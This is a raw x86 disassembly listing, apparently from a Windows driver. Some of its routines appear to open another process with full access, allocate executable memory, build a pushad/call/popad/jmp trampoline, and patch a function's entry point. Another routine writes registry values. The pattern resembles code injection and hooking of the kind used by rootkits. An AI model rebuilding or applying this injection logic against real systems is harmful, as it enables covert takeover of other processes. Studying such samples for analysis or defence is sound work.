   16e31:	pop    esi
   16e32:	leave  
   16e33:	ret    0xc
   16e36:	int3   
   16e37:	int3   
   16e38:	int3   
   16e39:	int3   
   16e3a:	int3   
   16e3b:	int3   
   16e3c:	mov    edi,edi
   16e3e:	push   esi
   16e3f:	mov    esi,ecx
   16e41:	mov    BYTE PTR [esi+0x8],0x0
   16e45:	call   0x14046
   16e4a:	mov    eax,esi
   16e4c:	pop    esi
   16e4d:	ret    0x8
   16e50:	int3   
   16e51:	int3   
   16e52:	int3   
   16e53:	int3   
   16e54:	int3   
   16e55:	int3   
   16e56:	mov    edi,edi
   16e58:	push   ebp
   16e59:	mov    ebp,esp
   16e5b:	sub    esp,0xb0
   16e61:	push   esi
   16e62:	mov    esi,ecx
   16e64:	lea    ecx,[ebp-0x58]
   16e67:	call   0x136b6
   16e6c:	push   eax
   16e6d:	push   DWORD PTR [ebp+0x8]
   16e70:	lea    ecx,[ebp-0xb0]
   16e76:	call   0x13892
   16e7b:	push   eax
   16e7c:	lea    eax,[ebp-0x8]
   16e7f:	push   eax
   16e80:	mov    ecx,esi
   16e82:	call   0x16ab0
   16e87:	mov    esi,DWORD PTR [eax]
   16e89:	lea    ecx,[ebp-0xb0]
   16e8f:	call   0x12ab0
   16e94:	lea    ecx,[ebp-0x58]
   16e97:	call   0x11e9e
   16e9c:	lea    eax,[esi+0x18]
   16e9f:	pop    esi
   16ea0:	leave  
   16ea1:	ret    0x4
   16ea4:	int3   
   16ea5:	int3   
   16ea6:	int3   
   16ea7:	int3   
   16ea8:	int3   
   16ea9:	int3   
   16eaa:	mov    edi,edi
   16eac:	push   ebp
   16ead:	mov    ebp,esp
   16eaf:	sub    esp,0x20
   16eb2:	push   esi
   16eb3:	push   0xffffffff
   16eb5:	mov    esi,ecx
   16eb7:	push   0x1ded0
   16ebc:	lea    ecx,[ebp-0x8]
   16ebf:	call   0x1109a
   16ec4:	lea    eax,[ebp-0x8]
   16ec7:	push   eax
   16ec8:	push   DWORD PTR [ebp+0x8]
   16ecb:	lea    ecx,[ebp-0x20]
   16ece:	call   0x135e6
   16ed3:	push   eax
   16ed4:	lea    eax,[ebp-0x10]
   16ed7:	push   eax
   16ed8:	mov    ecx,esi
   16eda:	call   0x16af8
   16edf:	mov    esi,DWORD PTR [eax]
   16ee1:	lea    ecx,[ebp-0x20]
   16ee4:	call   0x1107c
   16ee9:	push   DWORD PTR [ebp-0x8]
   16eec:	call   0x1d9f8
   16ef1:	pop    ecx
   16ef2:	lea    eax,[esi+0x14]
   16ef5:	pop    esi
   16ef6:	leave  
   16ef7:	ret    0x4
   16efa:	int3   
   16efb:	int3   
   16efc:	int3   
   16efd:	int3   
   16efe:	int3   
   16eff:	int3   
   16f00:	mov    edi,edi
   16f02:	push   esi
   16f03:	mov    esi,ecx
   16f05:	mov    BYTE PTR [esi+0x8],0x0
   16f09:	call   0x1416e
   16f0e:	mov    eax,esi
   16f10:	pop    esi
   16f11:	ret    0x8
   16f14:	int3   
   16f15:	int3   
   16f16:	int3   
   16f17:	int3   
   16f18:	int3   
   16f19:	int3   
   16f1a:	mov    edi,edi
   16f1c:	push   ebp
   16f1d:	mov    ebp,esp
   16f1f:	sub    esp,0x14
   16f22:	and    DWORD PTR [ebp-0x4],0x0
   16f26:	push   esi
   16f27:	lea    eax,[ebp-0x4]
   16f2a:	push   eax
   16f2b:	push   DWORD PTR [ebp+0x8]
   16f2e:	mov    esi,ecx
   16f30:	lea    ecx,[ebp-0xc]
   16f33:	call   0x12bee
   16f38:	push   eax
   16f39:	lea    eax,[ebp-0x14]
   16f3c:	push   eax
   16f3d:	mov    ecx,esi
   16f3f:	call   0x16b22
   16f44:	mov    ecx,DWORD PTR [ebp-0x8]
   16f47:	mov    esi,DWORD PTR [eax]
   16f49:	test   ecx,ecx
   16f4b:	je     0x16f52
   16f4d:	call   0x10a86
   16f52:	lea    eax,[esi+0x10]
   16f55:	pop    esi
   16f56:	leave  
   16f57:	ret    0x4
   16f5a:	int3   
   16f5b:	int3   
   16f5c:	int3   
   16f5d:	int3   
   16f5e:	int3   
   16f5f:	int3   
   16f60:	mov    edi,edi
   16f62:	push   ebp
   16f63:	mov    ebp,esp
   16f65:	sub    esp,0x20
   16f68:	push   esi
   16f69:	mov    esi,ecx
   16f6b:	mov    eax,DWORD PTR [esi+0x24]
   16f6e:	mov    ecx,DWORD PTR [esi+0x28]
   16f71:	add    ecx,eax
   16f73:	cmp    DWORD PTR [esi+0x10],ecx
   16f76:	jbe    0x17009
   16f7c:	mov    ecx,DWORD PTR [esi+0x18]
   16f7f:	mov    ecx,DWORD PTR [ecx]
   16f81:	push   edi
   16f82:	mov    DWORD PTR [ebp-0x4],ecx
   16f85:	test   eax,eax
   16f87:	je     0x16f96
   16f89:	mov    edi,eax
   16f8b:	lea    ecx,[ebp-0x4]
   16f8e:	call   0x12ec0
   16f93:	dec    edi
   16f94:	jne    0x16f8b
   16f96:	mov    eax,DWORD PTR [ebp-0x4]
   16f99:	mov    edi,DWORD PTR [eax+0xc]
   16f9c:	lea    ecx,[ebp-0x20]
   16f9f:	mov    BYTE PTR [ebp-0x18],0x0
   16fa3:	call   0x144a2
   16fa8:	mov    eax,DWORD PTR [esi+0x8]
   16fab:	mov    ecx,DWORD PTR [eax]
   16fad:	mov    DWORD PTR [ebp-0x4],ecx
   16fb0:	cmp    ecx,eax
   16fb2:	je     0x16ff3
   16fb4:	lea    edx,[ecx+0x68]
   16fb7:	mov    eax,DWORD PTR [edx]
   16fb9:	cmp    eax,edi
   16fbb:	jae    0x16fd2
   16fbd:	push   ecx
   16fbe:	lea    eax,[ebp-0x8]
   16fc1:	push   eax
   16fc2:	lea    ecx,[esi+0x4]
   16fc5:	call   0x14efa
   16fca:	mov    ecx,DWORD PTR [ebp-0x8]
   16fcd:	mov    DWORD PTR [ebp-0x4],ecx
   16fd0:	jmp    0x16fee
   16fd2:	sub    eax,edi
   16fd4:	mov    DWORD PTR [edx],eax
   16fd6:	push   edx
   16fd7:	lea    eax,[ebp-0x10]
   16fda:	push   eax
   16fdb:	lea    ecx,[ebp-0x20]
   16fde:	call   0x16086
   16fe3:	lea    ecx,[ebp-0x4]
   16fe6:	call   0x12e4a
   16feb:	mov    ecx,DWORD PTR [ebp-0x4]
   16fee:	cmp    ecx,DWORD PTR [esi+0x8]
   16ff1:	jne    0x16fb4
   16ff3:	lea    eax,[ebp-0x20]
   16ff6:	push   eax
   16ff7:	add    esi,0x14
   16ffa:	push   esi
   16ffb:	call   0x16626
   17000:	lea    ecx,[ebp-0x20]
   17003:	call   0x160b0
   17008:	pop    edi
   17009:	pop    esi
   1700a:	leave  
   1700b:	ret    
   1700c:	int3   
   1700d:	int3   
   1700e:	int3   
   1700f:	int3   
   17010:	int3   
   17011:	int3   
   17012:	mov    edi,edi
   17014:	push   ebp
   17015:	mov    ebp,esp
   17017:	sub    esp,0x20
   1701a:	push   esi
   1701b:	push   0xffffffff
   1701d:	mov    esi,ecx
   1701f:	push   0x1de2e
   17024:	lea    ecx,[ebp-0x8]
   17027:	call   0x1113e
   1702c:	lea    eax,[ebp-0x8]
   1702f:	push   eax
   17030:	push   DWORD PTR [ebp+0x8]
   17033:	lea    ecx,[ebp-0x20]
   17036:	call   0x135be
   1703b:	push   eax
   1703c:	lea    eax,[ebp-0x10]
   1703f:	push   eax
   17040:	mov    ecx,esi
   17042:	call   0x16bb4
   17047:	mov    esi,DWORD PTR [eax]
   17049:	lea    ecx,[ebp-0x20]
   1704c:	call   0x1107c
   17051:	push   DWORD PTR [ebp-0x8]
   17054:	call   0x1d9f8
   17059:	pop    ecx
   1705a:	lea    eax,[esi+0x14]
   1705d:	pop    esi
   1705e:	leave  
   1705f:	ret    0x4
   17062:	int3   
   17063:	int3   
   17064:	int3   
   17065:	int3   
   17066:	int3   
   17067:	int3   
   17068:	mov    edi,edi
   1706a:	push   ebp
   1706b:	mov    ebp,esp
   1706d:	sub    esp,0x838
   17073:	mov    eax,ds:0x7e528
   17078:	xor    eax,ebp
   1707a:	mov    DWORD PTR [ebp-0x4],eax
   1707d:	mov    eax,DWORD PTR [ebp+0x8]
   17080:	push   ebx
   17081:	push   esi
   17082:	push   edi
   17083:	mov    DWORD PTR [ebp-0x808],eax
   17089:	xor    eax,eax
   1708b:	push   0x7fe
   17090:	mov    WORD PTR [ebp-0x804],ax
   17097:	xor    ebx,ebx
   17099:	lea    eax,[ebp-0x802]
   1709f:	push   ebx
   170a0:	push   eax
   170a1:	call   0x1da92
   170a6:	mov    eax,0x7e6c0
   170ab:	add    esp,0xc
   170ae:	mov    edx,eax
   170b0:	mov    cx,WORD PTR [eax]
   170b3:	inc    eax
   170b4:	inc    eax
   170b5:	cmp    cx,bx
   170b8:	jne    0x170b0
   170ba:	sub    eax,edx
   170bc:	lea    edi,[ebp-0x804]
   170c2:	dec    edi
   170c3:	dec    edi
   170c4:	mov    cx,WORD PTR [edi+0x2]
   170c8:	inc    edi
   170c9:	inc    edi
   170ca:	cmp    cx,bx
   170cd:	jne    0x170c4
   170cf:	mov    ecx,eax
   170d1:	shr    ecx,0x2
   170d4:	mov    esi,edx
   170d6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   170d8:	mov    ecx,eax
   170da:	mov    eax,DWORD PTR [ebp-0x808]
   170e0:	and    ecx,0x3
   170e3:	add    eax,0x400
   170e8:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   170ea:	mov    edx,eax
   170ec:	mov    cx,WORD PTR [eax]
   170ef:	inc    eax
   170f0:	inc    eax
   170f1:	cmp    cx,bx
   170f4:	jne    0x170ec
   170f6:	sub    eax,edx
   170f8:	lea    edi,[ebp-0x804]
   170fe:	dec    edi
   170ff:	dec    edi
   17100:	mov    cx,WORD PTR [edi+0x2]
   17104:	inc    edi
   17105:	inc    edi
   17106:	cmp    cx,bx
   17109:	jne    0x17100
   1710b:	mov    ecx,eax
   1710d:	shr    ecx,0x2
   17110:	mov    esi,edx
   17112:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   17114:	mov    ecx,eax
   17116:	and    ecx,0x3
   17119:	lea    eax,[ebp-0x804]
   1711f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17121:	mov    DWORD PTR [ebp-0x818],eax
   17127:	lea    ecx,[eax+0x2]
   1712a:	mov    dx,WORD PTR [eax]
   1712d:	inc    eax
   1712e:	inc    eax
   1712f:	cmp    dx,bx
   17132:	jne    0x1712a
   17134:	sub    eax,ecx
   17136:	sar    eax,1
   17138:	add    eax,eax
   1713a:	mov    WORD PTR [ebp-0x81a],ax
   17141:	mov    WORD PTR [ebp-0x81c],ax
   17148:	lea    eax,[ebp-0x81c]
   1714e:	mov    DWORD PTR [ebp-0x82c],eax
   17154:	lea    eax,[ebp-0x838]
   1715a:	push   eax
   1715b:	xor    edi,edi
   1715d:	inc    edi
   1715e:	push   edi
   1715f:	push   ebx
   17160:	push   ebx
   17161:	lea    eax,[ebp-0x834]
   17167:	push   eax
   17168:	push   0xf003f
   1716d:	lea    eax,[ebp-0x80c]
   17173:	push   eax
   17174:	mov    DWORD PTR [ebp-0x834],0x18
   1717e:	mov    DWORD PTR [ebp-0x830],ebx
   17184:	mov    DWORD PTR [ebp-0x828],0x40
   1718e:	mov    DWORD PTR [ebp-0x824],ebx
   17194:	mov    DWORD PTR [ebp-0x820],ebx
   1719a:	call   0x119b6
   1719f:	call   eax
   171a1:	test   eax,eax
   171a3:	jl     0x17332
   171a9:	push   0x1e546
   171ae:	push   0x9
   171b0:	push   0x1e532
   171b5:	call   0x16c50
   171ba:	mov    DWORD PTR [ebp-0x810],eax
   171c0:	lea    edx,[eax+0x2]
   171c3:	mov    cx,WORD PTR [eax]
   171c6:	inc    eax
   171c7:	inc    eax
   171c8:	cmp    cx,bx
   171cb:	jne    0x171c3
   171cd:	sub    eax,edx
   171cf:	sar    eax,1
   171d1:	add    eax,eax
   171d3:	mov    WORD PTR [ebp-0x812],ax
   171da:	mov    WORD PTR [ebp-0x814],ax
   171e1:	mov    eax,DWORD PTR [ebp-0x808]
   171e7:	lea    ecx,[eax+0x2]
   171ea:	mov    dx,WORD PTR [eax]
   171ed:	inc    eax
   171ee:	inc    eax
   171ef:	cmp    dx,bx
   171f2:	jne    0x171ea
   171f4:	sub    eax,ecx
   171f6:	sar    eax,1
   171f8:	inc    eax
   171f9:	movzx  eax,ax
   171fc:	add    eax,eax
   171fe:	push   eax
   171ff:	push   DWORD PTR [ebp-0x808]
   17205:	lea    eax,[ebp-0x814]
   1720b:	push   edi
   1720c:	push   ebx
   1720d:	push   eax
   1720e:	push   DWORD PTR [ebp-0x80c]
   17214:	call   0x117e8
   17219:	call   eax
   1721b:	test   eax,eax
   1721d:	jl     0x17332
   17223:	push   0x1e4fc
   17228:	push   0x5
   1722a:	push   0x1e4f0
   1722f:	mov    DWORD PTR [ebp-0x808],0x3
   17239:	call   0x16c50
   1723e:	mov    DWORD PTR [ebp-0x810],eax
   17244:	lea    edx,[eax+0x2]
   17247:	mov    cx,WORD PTR [eax]
   1724a:	inc    eax
   1724b:	inc    eax
   1724c:	cmp    cx,bx
   1724f:	jne    0x17247
   17251:	sub    eax,edx
   17253:	push   0x4
   17255:	sar    eax,1
   17257:	pop    esi
   17258:	add    eax,eax
   1725a:	push   esi
   1725b:	mov    WORD PTR [ebp-0x812],ax
   17262:	mov    WORD PTR [ebp-0x814],ax
   17269:	lea    eax,[ebp-0x808]
   1726f:	push   eax
   17270:	push   esi
   17271:	push   ebx
   17272:	lea    eax,[ebp-0x814]
   17278:	push   eax
   17279:	push   DWORD PTR [ebp-0x80c]
   1727f:	call   0x117e8
   17284:	call   eax
   17286:	test   eax,eax
   17288:	jl     0x17332
   1728e:	push   0x1e4c2
   17293:	push   esi
   17294:	push   0x1e4b8
   17299:	mov    DWORD PTR [ebp-0x808],edi
   1729f:	call   0x16c50
   172a4:	mov    DWORD PTR [ebp-0x810],eax
   172aa:	lea    ecx,[eax+0x2]
   172ad:	mov    dx,WORD PTR [eax]
   172b0:	inc    eax
   172b1:	inc    eax
   172b2:	cmp    dx,bx
   172b5:	jne    0x172ad
   172b7:	sub    eax,ecx
   172b9:	sar    eax,1
   172bb:	add    eax,eax
   172bd:	push   esi
   172be:	mov    WORD PTR [ebp-0x812],ax
   172c5:	mov    WORD PTR [ebp-0x814],ax
   172cc:	lea    eax,[ebp-0x808]
   172d2:	push   eax
   172d3:	push   esi
   172d4:	push   ebx
   172d5:	lea    eax,[ebp-0x814]
   172db:	push   eax
   172dc:	push   DWORD PTR [ebp-0x80c]
   172e2:	call   0x117e8
   172e7:	call   eax
   172e9:	test   eax,eax
   172eb:	jl     0x17332
   172ed:	lea    eax,[ebp-0x81c]
   172f3:	push   eax
   172f4:	call   0x1198c
   172f9:	call   eax
   172fb:	test   eax,eax
   172fd:	jl     0x17332
   172ff:	lea    eax,[ebp-0x804]
   17305:	push   eax
   17306:	push   DWORD PTR [ebp-0x80c]
   1730c:	call   0x1212e
   17311:	test   al,al
   17313:	je     0x17326
   17315:	push   DWORD PTR [ebp-0x80c]
   1731b:	call   0x117be
   17320:	call   eax
   17322:	test   eax,eax
   17324:	jl     0x17332
   17326:	push   DWORD PTR [ebp-0x80c]
   1732c:	call   DWORD PTR ds:0x1ee60
   17332:	mov    ecx,DWORD PTR [ebp-0x4]
   17335:	pop    edi
   17336:	pop    esi
   17337:	xor    ecx,ebp
   17339:	pop    ebx
   1733a:	call   0x1da15
   1733f:	leave  
   17340:	ret    0x4
   17343:	int3   
   17344:	int3   
   17345:	int3   
   17346:	int3   
   17347:	int3   
   17348:	mov    edi,edi
   1734a:	push   ebp
   1734b:	mov    ebp,esp
   1734d:	sub    esp,0x44
   17350:	mov    eax,DWORD PTR [ebp+0xc]
   17353:	mov    eax,DWORD PTR [eax]
   17355:	push   esi
   17356:	mov    DWORD PTR [ebp-0x2c],eax
   17359:	lea    eax,[ebp-0x2c]
   1735c:	push   eax
   1735d:	lea    eax,[ebp-0x44]
   17360:	push   eax
   17361:	xor    esi,esi
   17363:	push   0x1f0fff
   17368:	lea    eax,[ebp-0x10]
   1736b:	push   eax
   1736c:	mov    DWORD PTR [ebp-0x44],0x18
   17373:	mov    DWORD PTR [ebp-0x40],esi
   17376:	mov    DWORD PTR [ebp-0x38],0x200
   1737d:	mov    DWORD PTR [ebp-0x3c],esi
   17380:	mov    DWORD PTR [ebp-0x34],esi
   17383:	mov    DWORD PTR [ebp-0x30],esi
   17386:	mov    DWORD PTR [ebp-0x28],esi
   17389:	mov    DWORD PTR [ebp-0x10],esi
   1738c:	call   0x1166e
   17391:	call   eax
   17393:	test   eax,eax
   17395:	jl     0x17606
   1739b:	push   ebx
   1739c:	push   edi
   1739d:	push   0x40
   1739f:	mov    edi,0x1000
   173a4:	push   edi
   173a5:	lea    eax,[ebp-0x14]
   173a8:	push   eax
   173a9:	push   esi
   173aa:	lea    eax,[ebp-0x8]
   173ad:	push   eax
   173ae:	push   DWORD PTR [ebp-0x10]
   173b1:	mov    DWORD PTR [ebp-0x8],esi
   173b4:	mov    esi,DWORD PTR ds:0x1ee40
   173ba:	mov    ebx,0x400
   173bf:	mov    DWORD PTR [ebp-0x14],ebx
   173c2:	call   esi
   173c4:	test   eax,eax
   173c6:	jl     0x173d1
   173c8:	mov    eax,DWORD PTR [ebp-0x8]
   173cb:	mov    ecx,DWORD PTR [ebp+0xc]
   173ce:	mov    DWORD PTR [ecx+0x8],eax
   173d1:	and    DWORD PTR [ebp-0x18],0x0
   173d5:	push   0x4
   173d7:	push   edi
   173d8:	lea    eax,[ebp-0x14]
   173db:	push   eax
   173dc:	push   0x0
   173de:	lea    eax,[ebp-0x18]
   173e1:	push   eax
   173e2:	push   DWORD PTR [ebp-0x10]
   173e5:	mov    DWORD PTR [ebp-0x14],ebx
   173e8:	call   esi
   173ea:	test   eax,eax
   173ec:	jl     0x173f7
   173ee:	mov    eax,DWORD PTR [ebp-0x18]
   173f1:	mov    ecx,DWORD PTR [ebp+0xc]
   173f4:	mov    DWORD PTR [ecx+0xc],eax
   173f7:	lea    eax,[ebp-0x1c]
   173fa:	push   eax
   173fb:	push   DWORD PTR [ebp-0x2c]
   173fe:	call   0x11c80
   17403:	call   eax
   17405:	test   eax,eax
   17407:	jl     0x17604
   1740d:	push   DWORD PTR [ebp-0x1c]
   17410:	call   0x11a34
   17415:	call   eax
   17417:	mov    ebx,DWORD PTR [ebp-0x8]
   1741a:	and    DWORD PTR [ebp-0x4],0x0
   1741e:	test   ebx,ebx
   17420:	je     0x175ea
   17426:	mov    edi,DWORD PTR [ebp-0x18]
   17429:	push   0x40
   1742b:	push   0x7e408
   17430:	push   edi
   17431:	mov    DWORD PTR [ebp-0xc],edi
   17434:	call   0x1981e
   17439:	push   0x1e586
   1743e:	push   0x4
   17440:	push   0x1e57c
   17445:	call   0x16c50
   1744a:	mov    esi,eax
   1744c:	mov    cx,WORD PTR [eax]
   1744f:	inc    eax
   17450:	inc    eax
   17451:	test   cx,cx
   17454:	jne    0x1744c
   17456:	sub    eax,esi
   17458:	dec    edi
   17459:	dec    edi
   1745a:	mov    cx,WORD PTR [edi+0x2]
   1745e:	inc    edi
   1745f:	inc    edi
   17460:	test   cx,cx
   17463:	jne    0x1745a
   17465:	mov    ecx,eax
   17467:	shr    ecx,0x2
   1746a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1746c:	mov    ecx,eax
   1746e:	push   0x60
   17470:	and    ecx,0x3
   17473:	push   ebx
   17474:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   17476:	mov    DWORD PTR [ebp-0x20],ebx
   17479:	call   0x197d0
   1747e:	push   0x68
   17480:	push   eax
   17481:	call   0x197d0
   17486:	push   DWORD PTR [ebp-0xc]
   17489:	push   eax
   1748a:	call   0x197e8
   1748f:	push   0xb8
   17494:	push   eax
   17495:	call   0x197d0
   1749a:	push   DWORD PTR ds:0x7ef70
   174a0:	push   eax
   174a1:	call   0x197e8
   174a6:	push   0xc00b
   174ab:	push   eax
   174ac:	call   0x19802
   174b1:	push   0x74
   174b3:	push   eax
   174b4:	call   0x197d0
   174b9:	push   0x2
   174bb:	push   eax
   174bc:	call   0x197d0
   174c1:	push   0xd0ff
   174c6:	push   eax
   174c7:	call   0x19802
   174cc:	push   0x61
   174ce:	push   eax
   174cf:	call   0x197d0
   174d4:	mov    ebx,DWORD PTR [ebp+0x8]
   174d7:	mov    edi,eax
   174d9:	mov    esi,ebx
   174db:	push   0x0
   174dd:	push   esi
   174de:	push   edi
   174df:	call   0x19f8a
   174e4:	mov    ecx,eax
   174e6:	sub    ecx,esi
   174e8:	add    DWORD PTR [ebp-0x4],ecx
   174eb:	add    edi,ecx
   174ed:	cmp    DWORD PTR [ebp-0x4],0x5
   174f1:	mov    esi,eax
   174f3:	jb     0x174db
   174f5:	mov    eax,DWORD PTR [ebp-0x4]
   174f8:	push   edi
   174f9:	add    eax,ebx
   174fb:	push   eax
   174fc:	call   0x19846
   17501:	mov    eax,DWORD PTR [ebp-0x8]
   17504:	test   eax,eax
   17506:	je     0x175ea
   1750c:	add    eax,0x400
   17511:	lea    ecx,[eax-0x10]
   17514:	mov    DWORD PTR [ebp-0x24],ecx
   17517:	mov    ecx,DWORD PTR [ebp-0x4]
   1751a:	lea    esi,[eax-0xc]
   1751d:	push   esi
   1751e:	lea    edi,[eax-0x4]
   17521:	lea    ebx,[eax-0x8]
   17524:	shr    ecx,0x2
   17527:	lea    ecx,[ecx*4+0x14]
   1752e:	push   0x40
   17530:	sub    eax,ecx
   17532:	push   ebx
   17533:	mov    DWORD PTR [ebp-0xc],eax
   17536:	mov    eax,DWORD PTR [ebp+0x8]
   17539:	mov    DWORD PTR [edi],eax
   1753b:	push   edi
   1753c:	mov    DWORD PTR [ebx],0x5
   17542:	and    DWORD PTR [esi],0x0
   17545:	push   0xffffffff
   17547:	call   DWORD PTR ds:0x7eeec
   1754d:	test   eax,eax
   1754f:	jl     0x175b4
   17551:	push   DWORD PTR [ebp-0x4]
   17554:	push   0x90
   17559:	push   DWORD PTR [ebp-0xc]
   1755c:	call   0x1da92
   17561:	mov    eax,DWORD PTR [ebp-0x20]
   17564:	sub    eax,DWORD PTR [ebp+0x8]
   17567:	add    esp,0xc
   1756a:	sub    eax,0x5
   1756d:	push   eax
   1756e:	mov    eax,DWORD PTR [ebp-0xc]
   17571:	inc    eax
   17572:	push   eax
   17573:	call   0x197e8
   17578:	push   0xe9
   1757d:	push   DWORD PTR [ebp-0xc]
   17580:	call   0x197d0
   17585:	mov    eax,DWORD PTR [ebp-0x24]
   17588:	and    DWORD PTR [eax],0x0
   1758b:	push   eax
   1758c:	push   DWORD PTR [ebp-0x4]
   1758f:	push   DWORD PTR [ebp-0xc]
   17592:	push   DWORD PTR [ebp+0x8]
   17595:	push   0xffffffff
   17597:	call   DWORD PTR ds:0x7eee0
   1759d:	mov    eax,DWORD PTR [ebp+0xc]
   175a0:	mov    BYTE PTR [eax+0x10],0x1
   175a4:	lea    eax,[ebp-0x20]
   175a7:	push   eax
   175a8:	push   DWORD PTR [esi]
   175aa:	push   ebx
   175ab:	push   edi
   175ac:	push   0xffffffff
   175ae:	call   DWORD PTR ds:0x7eeec
   175b4:	mov    esi,DWORD PTR [ebp-0x8]
   175b7:	test   esi,esi
   175b9:	je     0x175ea
   175bb:	lea    eax,[esi+0x400]
   175c1:	lea    ecx,[eax-0x4]
   175c4:	lea    edx,[eax-0x8]
   175c7:	add    eax,0xfffffff4
   175ca:	push   eax
   175cb:	push   0x20
   175cd:	push   edx
   175ce:	mov    DWORD PTR [ecx],esi
   175d0:	push   ecx
   175d1:	mov    DWORD PTR [edx],0x400
   175d7:	and    DWORD PTR [eax],0x0
   175da:	push   0xffffffff
   175dc:	call   DWORD PTR ds:0x7eeec
   175e2:	test   eax,eax
   175e4:	jge    0x175ea
   175e6:	and    DWORD PTR [ebp-0x8],0x0
   175ea:	call   0x11a0a
   175ef:	call   eax
   175f1:	call   0x11c56
   175f6:	mov    ecx,DWORD PTR [ebp-0x1c]
   175f9:	call   eax
   175fb:	push   DWORD PTR [ebp-0x10]
   175fe:	call   DWORD PTR ds:0x1ee60
   17604:	pop    edi
   17605:	pop    ebx
   17606:	pop    esi
   17607:	leave  
   17608:	ret    0x8
   1760b:	int3   
   1760c:	int3   
   1760d:	int3   
   1760e:	int3   
   1760f:	int3   
   17610:	mov    edi,edi
   17612:	push   ebp
   17613:	mov    ebp,esp
   17615:	cmp    DWORD PTR ds:0x7ef70,0x0
   1761c:	push   esi
   1761d:	mov    esi,DWORD PTR [ebp+0x10]
   17620:	jne    0x176eb
   17626:	push   0x1e730
   1762b:	push   0xc
   1762d:	push   0x1e716
   17632:	call   0x16c50
   17637:	push   eax
   17638:	push   DWORD PTR [ebp+0x8]
   1763b:	call   0x10de4
   17640:	test   al,al
   17642:	je     0x176eb
   17648:	mov    eax,DWORD PTR [esi+0x4]
   1764b:	push   0x1e6ee
   17650:	push   0xc
   17652:	push   0x1e6e0
   17657:	mov    ds:0x7ef68,eax
   1765c:	call   0x16d46
   17661:	push   eax
   17662:	push   DWORD PTR [esi+0x4]
   17665:	call   0x12392
   1766a:	push   0x1e6ba
   1766f:	push   0xc
   17671:	push   0x1e6ac
   17676:	mov    ds:0x7ef70,eax
   1767b:	call   0x16d46
   17680:	push   eax
   17681:	push   DWORD PTR [esi+0x4]
   17684:	call   0x12392
   17689:	push   0x1e68a
   1768e:	push   0xc
   17690:	push   0x1e67c
   17695:	mov    ds:0x7ef74,eax
   1769a:	call   0x16d46
   1769f:	push   eax
   176a0:	push   DWORD PTR [esi+0x4]
   176a3:	call   0x12392
   176a8:	push   0x1e640
   176ad:	push   0x5
   176af:	push   0x1e63a
   176b4:	mov    ds:0x7ef78,eax
   176b9:	call   0x16d46
   176be:	push   eax
   176bf:	push   DWORD PTR [esi+0x4]
   176c2:	call   0x12392
   176c7:	push   0x1e602
   176cc:	push   0x4
   176ce:	push   0x1e5fc
   176d3:	mov    ds:0x7ef7c,eax
   176d8:	call   0x16d46
   176dd:	push   eax
   176de:	push   DWORD PTR [esi+0x4]
   176e1:	call   0x12392
   176e6:	mov    ds:0x7ef80,eax
   176eb:	cmp    DWORD PTR ds:0x7ef6c,0x0
   176f2:	jne    0x1771a
   176f4:	push   0x1e5c2
   176f9:	push   0x9
   176fb:	push   0x1e5ae
   17700:	call   0x16c50
   17705:	push   eax
   17706:	push   DWORD PTR [ebp+0x8]
   17709:	call   0x10de4
   1770e:	test   al,al
   17710:	je     0x1771a
   17712:	mov    eax,DWORD PTR [esi+0x4]
   17715:	mov    ds:0x7ef6c,eax
   1771a:	pop    esi
   1771b:	pop    ebp
   1771c:	ret    0xc
   1771f:	int3   
   17720:	int3   
   17721:	int3   
   17722:	int3   
   17723:	int3   
   17724:	mov    edi,edi
   17726:	push   ebp
   17727:	mov    ebp,esp
   17729:	sub    esp,0x4c
   1772c:	push   ebx
   1772d:	push   esi
   1772e:	push   edi
   1772f:	push   DWORD PTR [ebp+0xc]
   17732:	push   DWORD PTR [ebp+0x8]
   17735:	call   DWORD PTR ds:0x7eef8
   1773b:	mov    DWORD PTR [ebp-0x8],eax
   1773e:	xor    eax,eax
   17740:	xor    ebx,ebx
   17742:	mov    DWORD PTR [ebp-0x30],ebx
   17745:	lea    edi,[ebp-0x2c]
   17748:	stos   DWORD PTR es:[edi],eax
   17749:	stos   DWORD PTR es:[edi],eax
   1774a:	stos   DWORD PTR es:[edi],eax
   1774b:	stos   DWORD PTR es:[edi],eax
   1774c:	xor    eax,eax
   1774e:	mov    DWORD PTR [ebp-0x1c],ebx
   17751:	lea    edi,[ebp-0x18]
   17754:	stos   DWORD PTR es:[edi],eax
   17755:	stos   DWORD PTR es:[edi],eax
   17756:	stos   DWORD PTR es:[edi],eax
   17757:	stos   DWORD PTR es:[edi],eax
   17758:	lea    eax,[ebp-0x30]
   1775b:	push   eax
   1775c:	push   ebx
   1775d:	call   0x10e72
   17762:	mov    BYTE PTR [ebp+0xf],al
   17765:	lea    eax,[ebp-0x1c]
   17768:	push   eax
   17769:	push   0x1
   1776b:	call   0x10e72
   17770:	mov    BYTE PTR [ebp-0x1],al
   17773:	cmp    BYTE PTR [ebp+0xf],bl
   17776:	je     0x177d7
   17778:	mov    esi,DWORD PTR [ebp-0x30]
   1777b:	cmp    esi,ebx
   1777d:	je     0x177d7
   1777f:	push   0x6
   17781:	pop    ecx
   17782:	push   ebx
   17783:	xor    eax,eax
   17785:	mov    DWORD PTR [ebp-0x4c],ebx
   17788:	lea    edi,[ebp-0x48]
   1778b:	push   0x1c
   1778d:	rep stos DWORD PTR es:[edi],eax
   1778f:	lea    eax,[ebp-0x4c]
   17792:	push   eax
   17793:	push   ebx
   17794:	push   DWORD PTR [ebp+0x8]
   17797:	call   0x1190e
   1779c:	call   eax
   1779e:	cmp    DWORD PTR [ebp-0x44],esi
   177a1:	jne    0x177d7
   177a3:	push   ebx
   177a4:	push   0x4
   177a6:	lea    eax,[ebp+0xc]
   177a9:	push   eax
   177aa:	push   0x9
   177ac:	push   DWORD PTR [ebp+0x8]
   177af:	mov    DWORD PTR [ebp+0xc],ebx
   177b2:	call   0x1190e
   177b7:	call   eax
   177b9:	test   eax,eax
   177bb:	jge    0x177c0
   177bd:	mov    DWORD PTR [ebp+0xc],ebx
   177c0:	cmp    DWORD PTR [ebp+0xc],ebx
   177c3:	je     0x177d7
   177c5:	lea    eax,[ebp-0x30]
   177c8:	push   eax
   177c9:	push   DWORD PTR [ebp+0xc]
   177cc:	call   0x17348
   177d1:	push   ebx
   177d2:	call   0x10f08
